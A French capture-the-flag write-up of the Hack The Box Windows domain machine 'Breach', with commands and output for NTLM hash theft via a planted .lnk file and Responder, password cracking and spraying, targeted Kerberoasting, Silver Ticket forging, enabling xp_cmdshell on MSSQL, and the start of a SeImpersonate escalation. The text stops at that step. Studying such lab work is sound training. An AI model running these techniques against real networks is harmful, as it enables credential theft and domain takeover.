---
title: Breach
date: 2025-12-27 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Medium", "Windows", "Active Directory", "LLMNR Poisonning", "Targeted Kerberoasting", "Silver Tickets", "SeImpersonatePrivilege"]
---

**Breach** est une machine Windows de difficulté intermédiaire où l’accès invité à un partage SMB permet de capturer des hashes NTLMv2 et d’obtenir des identifiants valides. L’exploitation d’un compte de service kerberoastable, suivie d’une attaque **Silver Ticket**, permet l’exécution de commandes via **MSSQL** et une élévation de privilèges finale grâce au `SeImpersonatePrivilege`.

# Énumération 
## Nmap

Le scan révèle des ports semblant appartenir à un **contrôleur de domaine** : DNS (`53`), Kerberos (`88`), LDAP (`389` et `636`), ainsi que d'autres ports Windows : SMB (`445`), RDP (`3389`).
```bash
/workspace/Breach   7s
❯ rustscan -a 10.129.14.24 -u 5000 -- -A
--[snip]--
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-13 19:22:16Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-13T18:53:04
| Not valid after:  2055-12-13T18:53:04
| MD5:   e2678a8c7eb9507c5e9174dc23fe8d60
| SHA-1: 0c2115b3842888fb2a52dc6eafba39f573ad1689
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQOorcsfGg4a5E8RZc4cPtbzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMjEzMTg1MzA0WhgPMjA1NTEyMTMxODUzMDRaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL9H7aBp
| UYmbb5ZKFoqKK38CeNnvbQM2qOpDRFXAMp3yomj1a9hNUkVxHl7bl9wMoqol/eH8
| R1uNaQ5fYq6LlYM+N0SX6NJGumXepqkkK/QKfKEdjOS/Ohq0hvy5C9iM9RHPYNzY
| CA6kg/SyrXgVOxsmuGQ7pCmiT7er02RmFoOoxB/Ec9kbMcq6z03wXzsptGIaVC6n
| FZupE/z2BoyGGy+TEuXxZxu6YL2nSz/V5VPQtKHanp1s3oT4ULjnoLODbAt0kZf0
| 7D9+SnesjGF4t2WXEy8zcEkbtKM1xoFn7s54PkN9q2eD9cWaJ8x4dgvAFIsshSyE
| 65bX5neCeUIsW4kCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAXA/pSzkR2KqYhKQC
| b+iUbi6RkPdlsAMj5ObNjx0ONsLk5Oja3y2+pkFpoJR6o6fSd5ZtP5kqQo5b4FdZ
| 7Kya25uDo19jFK6q/tqkczd3RN7ei1KhdqXh+rNHA5AQ8xhBEjQ8AP4rSycincyu
| YkTv6zM0rbC8px3StvKk/1Ds9o68n0RX0rx6iSnHggqJamBVwR/Pp/1BFZ3pZuvB
| GEob9CTK2mwmt60a9cdeGfs7SstVI2+rUUmopm4MPyFY7Oq7A/EtEiJS2DQrw9+8
| EZfibOm/VpCLFqWBLrKBhbdeWr4YA/B9m8nJCEUknVJDyxTZnikA4VH8kOuSLbdS
| FqcSgg==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-12-13T19:23:53+00:00; 0s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-12-13T19:23:53+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Issuer: commonName=BREACHDC.breach.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-07T08:04:48
| Not valid after:  2026-03-09T08:04:48
| MD5:   f45754f6007310baecb20f99fca9d035
| SHA-1: ccc99cbf517171cb42e14951243ce58ca229cd36
| -----BEGIN CERTIFICATE-----
| MIIC6DCCAdCgAwIBAgIQG2ZJBuyGl6BOPrQhGij+hzANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDExJCUkVBQ0hEQy5icmVhY2gudmwwHhcNMjUwOTA3MDgwNDQ4WhcN
| MjYwMzA5MDgwNDQ4WjAdMRswGQYDVQQDExJCUkVBQ0hEQy5icmVhY2gudmwwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDr0Po1BNi/Rf86RA49UWp30Roe
| cyMjyHDf8rw7jXP1e2r8EjqlTnsqF1jXTDF15O4XnKxXDZgbfA5HMJeKqEgiX6pU
| jCvPx7DltCjIZpeBsNXQ7VWMcufI2tkkxW9nMYl2tUAYlWUZ0vbtt9qcXlx5kTmD
| toYzUreg6H4dE3CvaqciqKv1jdfeGHJi4osmXfReKQm0kXQFQcznvI+sjZjW4nVd
| fXESwYUJW5AmD7/fsMCWiP1+QD13t3yiQmudfJfGWxvao6/QPyTQy8ReZqYhIowh
| Sipq3ANfBTnMDJ28LhAO7fjUIs32BGQ1b9vlPOLNFnxetwcDmwpgvEfCQomlAgMB
| AAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG
| 9w0BAQsFAAOCAQEAYxOQcP3pJC3UXcEgZON8YNGZyX1sAXQyx3USwdxUfNvGmRNG
| yUqzZZG4kfOwJ1UDOVsPP4jhVVK2W+6V7VP2InCse+8FBBg/JlbYhrUA/wXChSqT
| 4BlswCYPTCk5kxMfrS7yjLGDcsWC18gWoFUur5LNMIR8HpS9RnRgQB1DcoTAXpeL
| bY/gBEmgovd+Oc9AYS7TnUIKmfm9N5J4fyJkbrY/him706SVR7uSNxFOd4JCc8dt
| Yv+1uiByI7ypUay4F67yceFC+1QhYsP4DONBQu/lcDhRgSJX0/DRUbNq8ilXGD0j
| VcqqM+HRpdHucUitpvX1KojPvNQaCIFmE/cZww==
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-13T19:23:14+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
50020/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62414/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

J'ajoute le nom de domaine ainsi que le FQDN dans le fichier **/etc/hosts**.
```bash
echo "10.129.14.24 BREACHDC.breach.vl breach.vl BREACHDC"
```

## SMB (445)

L'énumération anonyme de partages est impossible.
```bash
/workspace/Breach
❯ nxc smb breachdc.breach.vl -u '' -p '' --shares
SMB         10.129.14.24    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.24    445    BREACHDC         [+] breach.vl\:
SMB         10.129.14.24    445    BREACHDC         [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Je trouve par contre des partages en tant que `Guest`. J'ai un accès en lecture et écriture sur le partage `share` ainsi qu'un accès en lecture sur les partages `Users` et `IPC$`
```bash
/workspace/Breach
❯ nxc smb breachdc.breach.vl -u 'guest' -p '' --shares
SMB         10.129.14.24    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.24    445    BREACHDC         [+] breach.vl\guest:
SMB         10.129.14.24    445    BREACHDC         [*] Enumerated shares
SMB         10.129.14.24    445    BREACHDC         Share           Permissions     Remark
SMB         10.129.14.24    445    BREACHDC         -----           -----------     ------
SMB         10.129.14.24    445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.14.24    445    BREACHDC         C$                              Default share
SMB         10.129.14.24    445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.14.24    445    BREACHDC         NETLOGON                        Logon server share
SMB         10.129.14.24    445    BREACHDC         share           READ,WRITE
SMB         10.129.14.24    445    BREACHDC         SYSVOL                          Logon server share
SMB         10.129.14.24    445    BREACHDC         Users           READ
```

Le partage Users ne contient rien d'intéressant à première vue.
```bash
/workspace/Breach
❯ smbclientng -d breach.vl -u guest -p '' -H 10.129.14.24
               _          _ _            _
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v3.0.0  |___/

  | Provide a password for 'breach.vl\guest':
[+] Successfully authenticated to '10.129.14.24' as 'breach.vl\guest'!
■[\\10.129.14.24\]> use users
■[\\10.129.14.24\Users\]> ls
d----r--     0.00 B  2022-02-17 14:12  .\
d--h--s-     0.00 B  2025-09-09 12:35  ..\
d--h-r--     0.00 B  2022-02-10 10:10  Default\
-a-h--s-   174.00 B  2021-05-08 10:18  desktop.ini
d----r--     0.00 B  2021-09-15 05:08  Public\
```

# Connexion en tant que Julia.Wong
## LLMNR Poisonning

Ce accès en écriture sur le partage `share` me fait penser au fait de pouvoir uploader des fichiers dans le partage share donc au [LLMNR Poisonning]([Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Sub-technique T1557.001 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1557/001/)). L’attaque consiste à :
1. **Écouter les requêtes LLMNR** sur le réseau
2. **Répondre frauduleusement** à la place de la vraie machine
3. Se faire passer pour la ressource demandée
4. Forcer la victime à s’authentifier
5. **Capturer le hash NTLM** de l’utilisateur

Je decide alors de créer un fichier malveillant me permettant de réaliser l'attaque dans le partage `share`. Pour cela j'utilise [ntlm_theft.py](https://github.com/Greenwolf/ntlm_theft) et je crée un fichier `.lnk` qui est l'extension d'un raccourcis Windows.
```bash
/workspace/Breach
❯ ntlm_theft.py --verbose --generate lnk --server "10.10.16.48" --filename "./getHash"
Created: getHash.lnk (OPEN)
Generation Complete.
```

Ensuite le démarre [responder](https://github.com/SpiderLabs/Responder), afin d'écouter toute requêtes venant de de plusieurs protocoles (ici c'est le SMB qui nous intéresse).
```bash
responder -I tun0
```

Maintenant le partage `share` qui contient trois dossiers.  J'uploade le fichier créé dans le dossier `transfert`. Donc lorsqu'un utilisateur cliquera sur le fichier, cela fera une requête vers mon listener. La victime essayera de se connecter afin d'accéder à la ressource et donc son hash NTLM sera capturer.
```bash
/workspace/Breach
❯ smbclientng -d breach.vl -u guest -p '' -H 10.129.14.24
               _          _ _            _
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v3.0.0  |___/

  | Provide a password for 'breach.vl\guest':
[+] Successfully authenticated to '10.129.14.24' as 'breach.vl\guest'!
■[\\10.129.14.24\]> use share
■[\\10.129.14.24\share\]> ls
d-------     0.00 B  2025-12-13 19:53  .\
d--h--s-     0.00 B  2025-09-09 12:35  ..\
d-------     0.00 B  2022-02-17 12:19  finance\
d-------     0.00 B  2022-02-17 12:19  software\
d-------     0.00 B  2025-09-08 12:13  transfer\
■[\\10.129.14.24\share\]> cd transfer/
■[\\10.129.14.24\share\transfer\]> put getHash.lnk
getHash.lnk
'getHash.lnk' ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 2.2/2.2 kB • ? • 0:00:00
■[\\10.129.14.24\share\transfer\]>
```

Quelques secondes plus tard j'obtiens le hash NTLMv2 de l'utilisateur `Julia.Wong`.
![](/images/Breach/Breach-1.png)

Je craque ce hash avec `john` et j'obtiens le mot de passe `Computer1`.
```bash
/workspace/Breach
❯ john --wordlist=`fzf-wordlists` julia.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Computer1        (Julia.Wong)
1g 0:00:00:00 DONE (2025-12-13 19:59) 25.00g/s 3072Kp/s 3072Kc/s 3072KC/s 022579..money89
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

## Password spraying

Avec ces identifiants valides, je récupère tous les autres utilisateurs du domaine dans un fichier `users.txt` avec l'option `--users-export` de [netexec](https://github.com/Pennyw0rth/NetExec).
```bash
/workspace/Breach   6s
❯ nxc smb breachdc.breach.vl -u 'julia.wong' -p 'Computer1' --users-export users.txt
SMB         10.129.14.24    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.24    445    BREACHDC         [+] breach.vl\julia.wong:Computer1
SMB         10.129.14.24    445    BREACHDC         -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.14.24    445    BREACHDC         Administrator                 2025-09-08 08:21:20 0       Built-in account for administering the computer/domain
SMB         10.129.14.24    445    BREACHDC         Guest                         2022-02-17 13:36:50 0       Built-in account for guest access to the computer/domain
SMB         10.129.14.24    445    BREACHDC         krbtgt                        2022-02-17 10:04:57 0       Key Distribution Center Service Account
SMB         10.129.14.24    445    BREACHDC         Claire.Pope                   2022-02-17 10:36:11 0
SMB         10.129.14.24    445    BREACHDC         Julia.Wong                    2022-02-17 12:58:50 0
SMB         10.129.14.24    445    BREACHDC         Hilary.Reed                   2022-02-17 10:36:11 0
SMB         10.129.14.24    445    BREACHDC         Diana.Pope                    2022-02-17 10:36:11 0
SMB         10.129.14.24    445    BREACHDC         Jasmine.Price                 2022-02-17 10:36:11 0
SMB         10.129.14.24    445    BREACHDC         George.Williams               2022-02-17 10:36:11 0
SMB         10.129.14.24    445    BREACHDC         Lawrence.Kaur                 2022-02-17 10:36:12 0
SMB         10.129.14.24    445    BREACHDC         Jasmine.Slater                2022-02-17 10:36:12 0
SMB         10.129.14.24    445    BREACHDC         Hugh.Watts                    2022-02-17 10:36:12 0
SMB         10.129.14.24    445    BREACHDC         Christine.Bruce               2022-02-17 10:36:12 0
SMB         10.129.14.24    445    BREACHDC         svc_mssql                     2022-02-17 10:43:08 0
SMB         10.129.14.24    445    BREACHDC         [*] Enumerated 14 local users: BREACH
SMB         10.129.14.24    445    BREACHDC         [*] Writing 14 local users to users.txt
```

Je teste alors ce mot de passe sur ces utilisateurs et je vois que `Claire.Pope` l'utilise aussi.
```bash
/workspace/Breach   6s
❯ nxc smb breachdc.breach.vl -u users.txt -p 'Computer1' --continue-on-success
SMB         10.129.14.24    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Administrator:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Guest:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\krbtgt:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Claire.Pope:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [+] breach.vl\Julia.Wong:Computer1
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Hilary.Reed:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Diana.Pope:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Jasmine.Price:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\George.Williams:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Lawrence.Kaur:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Jasmine.Slater:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Hugh.Watts:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\Christine.Bruce:Computer1 STATUS_LOGON_FAILURE
SMB         10.129.14.24    445    BREACHDC         [-] breach.vl\svc_mssql:Computer1 STATUS_LOGON_FAILURE
```

## Bloodhound

Ensuite avec [rusthound](https://github.com/NH-RED-TEAM/RustHound), je récupère les relations entre les différents objets du domaine.
```bash
/workspace/Breach
❯ rusthound -d breach.vl -f breachdc.breach.vl -u julia.wong -p Computer1
---------------------------------------------------
Initializing RustHound at 20:05:20 on 12/13/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-12-13T19:05:20Z INFO  rusthound] Verbosity level: Info
[2025-12-13T19:05:20Z INFO  rusthound::ldap] Connected to BREACH.VL Active Directory!
[2025-12-13T19:05:20Z INFO  rusthound::ldap] Starting data collection...
[2025-12-13T19:05:21Z INFO  rusthound::ldap] All data collected for NamingContext DC=breach,DC=vl
[2025-12-13T19:05:21Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-12-13T19:05:21Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-12-13T19:05:21Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-12-13T19:05:21Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-12-13T19:05:21Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 15 users parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213200521_breach-vl_users.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 62 groups parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213200521_breach-vl_groups.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213200521_breach-vl_computers.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 2 ous parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213200521_breach-vl_ous.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213200521_breach-vl_domains.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213200521_breach-vl_gpos.json created!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-12-13T19:05:21Z INFO  rusthound::json::maker] .//20251213200521_breach-vl_containers.json created!

RustHound Enumeration Completed at 20:05:21 on 12/13/25! Happy Graphing!
```

`Julia.Wong` n'a pas de privilèges intéressants.
![](/images/Breach/Breach-2.png)

Les administrateurs du domaine sont `Chrisine.Bruce` et `Administrator`.
![](/images/Breach/Breach-3.png)

L'utilisateur `svc_mssql` est kerberoastable.
![](/images/Breach/Breach-4.png)

Il possède les droits `SQLADMIN` sur le DC.
![](/images/Breach/Breach-5.png)

Je trouve aussi son `ServicePrincipalName (SPN)`.
![](/images/Breach/Breach-6.png)

# Shell en tant que svc_mssql
## Targeted Kerberoasting

Je réalise alors l'attaque [Targeted Kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting) afin de récupérer son ticket Kerberos.
```bash
/workspace/Breach
❯ targetedKerberoast.py -v -d breach.vl -u julia.wong -p Computer1 -o Kerberoastables.txt
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Writing hash to file for (svc_mssql)
```

Puis je craque ce ticket avec `john` et je récupère le mot de passe `Trustno1`.
```bash
/workspace/Breach
❯ john --wordlist=`fzf-wordlists` Kerberoastables.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Trustno1         (?)
1g 0:00:00:00 DONE (2025-12-13 20:15) 25.00g/s 1331Kp/s 1331Kc/s 1331KC/s triplet..soydivina
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Je peux ensuite me connecter avec les identifiants trouvés. Mais l'utilisateur `svc_mssql` n'a aucun privilèges me permettant d'avancer.
```bash
/workspace/Breach
❯ mssqlclient.py 'breach.vl/svc_mssql:Trustno1@breachdc.breach.vl'
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[-] ERROR(BREACHDC\SQLEXPRESS): Line 1: Login failed for user 'svc_mssql'.
```

## Silver Tickets

Sauf qu'il s'agit d'un compte avec le SPN du service MSSQL : `MSSQLSvc/breachdc.breach.vl:1433`. Je peux donc réaliser l'attaque [Silver Tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver#silver-tickets) qui consiste à forger avec le SPN d'un service, un ticket usurpant l'identité d'un utilisateur privilégié. Je forge alors un ticket pour l'utilisateur `administrator`. Pour cela j'utilise ticketer.py. Il faut renseigner le hash obtenu à partir du mot de passe de l'utilisateur `svc_mssql`. Il peut être obtenu sur [ce site](https://codebeautify.org/ntlm-hash-generator).
```bash
/workspace/Breach
❯ ticketer.py -nthash "69596C7AA1E8DAEE17F8E78870E25A5C" -spn 'MSSQLSvc/breachdc.breach.vl:1433' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl administrator
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

## Connexion MSSQL

Puis je me connecte avec ce ticket et maintenant j'ai plus de droits.
```bash
/workspace/Breach
❯ export KRB5CCNAME=administrator.ccache

/workspace/Breach
❯ mssqlclient.py 'breachdc.breach.vl' -k
Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell
ERROR(BREACHDC\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (BREACH\Administrator  dbo@master)> enable_xp_cmdshell
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell whoami
output
----------------
breach\svc_mssql

NULL

SQL (BREACH\Administrator  dbo@master)>
```

## Shell

Je peux alors exécuter des commandes avec un payload reverse shell PowerShell. et obtenir un shell en tant que `svc_mssql`.
![](/images/Breach/Breach-7.png)

Je récupère donc le premier flag.
```bash
PS C:\share> tree /f
Folder PATH listing
Volume serial number is B465-02B6
C:.
+---finance
+---software
+---transfer
    ?   getHash.lnk
    ?
    +---claire.pope
    +---diana.pope
    +---julia.wong
            user.txt

PS C:\type transfer/julia.wong/user.txt
55d****************************
```

# Shell en tant que nt authority\system
## SeImpersonatePrivilege

Je vois que l'utilisateur dispose de plusieurs droits dangereux. Mais moi je n'abuserai que du droit `SeImpersonatePrivilege`, qui lui permet d'usurper l'identité de n'importe qu'elle utilisateur.
![](/images/Breach/Breach-8.png)

Pour exploiter cette vulnérabilité, je peux utiliser comme sur la machine [Haze](https://z3rodol.github.io/2025/12/11/Haze/#SeImpersonatePrivilege), `GodPotato`. Donc je l'uploade ainsi que la version Windows de `netcat`.
![](/images/Breach/Breach-9.png)
